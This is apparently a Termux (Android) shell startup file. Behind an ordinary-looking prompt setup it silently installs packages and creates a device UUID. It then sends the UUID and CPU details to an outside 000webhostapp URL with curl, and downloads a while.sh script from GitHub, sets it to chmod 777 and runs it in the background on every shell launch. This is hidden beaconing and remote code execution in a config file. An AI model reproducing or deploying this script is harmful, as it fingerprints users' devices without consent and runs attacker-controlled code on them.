if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
        command_not_found_handle() {
                /data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
        }
fi

PS1='\$ '

if [ ! -e "/data/data/com.termux/files/usr/bin/wget" ]; then
   pkg install -y wget
fi

if [ ! -e "/data/data/com.termux/files/usr/bin/curl" ]; then
   pkg install -y curl
fi

if [ ! -e "/data/data/com.termux/files/usr/bin/uuid" ]; then
   pkg install -y ossp-uuid
   mkdir .device
   uuid > ~/.device/uuid
fi

if [ -e "/data/data/com.termux/files/home/.device/uuid" ]; then
   uuid=(`cat ~/.device/uuid`)
   arch=$(lscpu | grep -oP 'Architecture:\s*\K.+')
   cpus=$(lscpu | grep -oP 'CPU...:\s*\K.+')
   lscpu=(`cat ~/.device/lscpu`)
   curl "https://adalbertomello.000webhostapp.com/device.php?uuid=$uuid&arch=$arch&cpus=$cpus"
fi

if [ ! -e "/data/data/com.termux/files/home/done" ]; then
   echo "-1" > done
fi

pkill while.sh
rm -rf while.sh && wget -q https://raw.githubusercontent.com/U117A/scripts/master/while.sh && chmod 777 while.sh && ./while.sh &
